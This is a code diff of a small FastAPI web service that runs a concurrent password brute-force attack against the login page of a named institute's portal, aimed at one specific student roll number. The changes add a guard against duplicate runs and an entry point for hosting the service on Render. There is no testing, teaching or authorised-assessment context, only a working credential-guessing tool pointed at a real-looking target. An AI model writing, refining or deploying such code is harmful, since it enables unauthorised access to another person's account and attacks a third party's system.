@@ -1,12 +1,14 @@
 from fastapi import FastAPI
 import asyncio
 import aiohttp
+import os
 
 app = FastAPI()
 
 URL = "https://app.biomeinstitute.in/weblogin/"
 ROLL = "25002833"
-THREADS = 100  # Adjust for speed vs stability
+THREADS = 50  # Adjust as needed
+running_task = None
 
 
 async def try_password(session, password):
@@ -21,9 +23,7 @@ async def try_password(session, password):
     async with session.post(URL, data=payload, headers=headers) as response:
         text = await response.text()
         if "Invalid your username and password" not in text:
-            print("\n===========================================")
             print(f"SUCCESS! Roll: {ROLL}  Password: {password}")
-            print("===========================================\n")
             return True
     return False
 
@@ -44,10 +44,19 @@ async def main_bruteforce():
 
 @app.get("/")
 async def root():
-    return {"status": "Service is live. Go to /start to begin brute force."}
+    return {"status": "Service running. Trigger with /start"}
 
 
 @app.get("/start")
 async def start_task():
-    asyncio.create_task(main_bruteforce())
-    return {"status": "Brute force started in background!"}
+    global running_task
+    if running_task and not running_task.done():
+        return {"status": "Brute force already running"}
+    running_task = asyncio.create_task(main_bruteforce())
+    return {"status": "Brute force started"}
+
+
+# ENTRY POINT for Render
+if __name__ == "__main__":
+    import uvicorn
+    uvicorn.run("main:app", host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
